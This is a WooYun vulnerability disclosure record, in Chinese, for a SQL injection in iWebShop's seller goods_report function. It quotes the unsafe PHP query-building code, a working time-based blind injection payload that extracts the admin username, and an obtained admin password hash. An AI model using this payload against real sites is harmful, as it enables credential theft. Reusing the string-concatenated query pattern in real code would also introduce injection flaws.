{"id": 39705, "wybug_id": "wooyun-2015-093442", "wybug_title": "Iwebshop最新版注入一枚", "wybug_corp": "jooyea.net", "wybug_author": "路人甲", "wybug_date": "2015-04-09 12:39", "wybug_open_date": "2015-07-13 12:40", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-14：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向公众公开  简要描述： Iwebshop最新版注入一枚 详细说明：  看到wooyun上有人提了几个iweshop（2014-11-18更新）的漏洞（ WooYun: iWebShop开源电子商务系统SQL注入漏洞 ），去官网看了看，在2014-12-16 已更新到了 iwebshop2.9.14121000，下下来研究研究，希望不要重复。注入一枚：POST /index.php?controller=seller&action=goods_report    POST参数中的search作为一个数组传入，search的KEY and VALUE 都过滤不完全，注入成功，文件在/controllers/seller.php的goods_report()方法中看看代码/controllers/seller.php\n//商品列表\tpublic function goods_report()\t{\t\t\t$seller_id = $this->seller['seller_id'];\t\t$condition = IReq::get('search');\t\t$where = 'go.seller_id='.$seller_id;\t\tif (isset($condition)){\t\t\tforeach($condition as $key=>$item){\t\t\t\tif($item !== \"\"){\t\t\t\t\tif($key == \"go.store_nums\"){\t\t\t\t\t\t$where .= ' and '.$key.$item;\t\t\t\t\t}else\t\t\t\t\t{\t\t\t\t\t\t$where .= ' and '.$key.'\"'.$item.'\"';\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}\t\t\t\t$goodHandle = new IQuery('goods as go');\t\t$goodHandle->order  = \"go.id desc\";\t\t$goodHandle->fields = \"go.*\";\t\t$goodHandle->where  = $where;\t\t$goodList = $goodHandle->find();\ncondition是这样获得的$condition = IReq::get('search');，去看看IReq::get/lib/core/util/req_class.php\npublic static function get($key, $type=false)\t{\t\t//默认方式\t\tif($type==false)\t\t{\t\t\tif(isset($_GET[$key])) return $_GET[$key];\t\t\telse if(isset($_POST[$key])) return $_POST[$key];\t\t\telse return null;\t\t}\t\t//get方式\t\telse if($type=='get' && isset($_GET[$key]))\t\t\treturn $_GET[$key];\t\t//post方式\t\telse if($type=='post' && isset($_POST[$key]))\t\t\treturn $_POST[$key];\t\t//无匹配\t\telse\t\t\treturn null;\t}\n没有经过任何处理，直接把GET、POST的内容传入了再去看看$goodHandle->find()\npublic function find()\t{\t\t        if( is_int($this->page) )        {        \t        \t$sql=\"select $this->distinct $this->fields from $this->table $this->join $this->where $this->group $this->having $this->order\";\t\t\t$pagesize = isset($this->pagesize)?intval($this->pagesize):20;            $pagelength = isset($this->pagelength)?intval($this->pagelength):10;            $this->paging = new IPaging($sql,$pagesize,$pagelength);            return $this->paging->getPage($this->page);\t\t}\t\telse        {                    $sql=\"select $this->distinct $this->fields from $this->table $this->join $this->where $this->group $this->having $this->order $this->limit\";                       return $this->dbo->query($sql);        }\t}\n同样没有作防注处理，注入成功。测试方法：申请开店后，登录，然后发送下面的post包即可。Payload:POST提交\nsearch[1%3d-1/**/or(select/**/if(ord(mid((select/**/admin_name/**/from/**/iwebshop_admin/**/limit/**/0,1),1,1))%3d98,sleep(1),0))#]=test\n因为是time-based blind 注入，猜测管理员用户名的第一个字母时，若错误，延迟2s左右，如下图\n\n若正确，延迟5s左右（和数据库中的记录有关,测试时可减少）如下图\n\n按上面的方法依次做下去（burp intruder或者自己写个脚本跑），可测试管理员用户名为：admin，密码为： f6fdffe48c908deb0f4c3bd36c032e72   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-13 12:40 厂商回复：  漏洞Rank：8  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}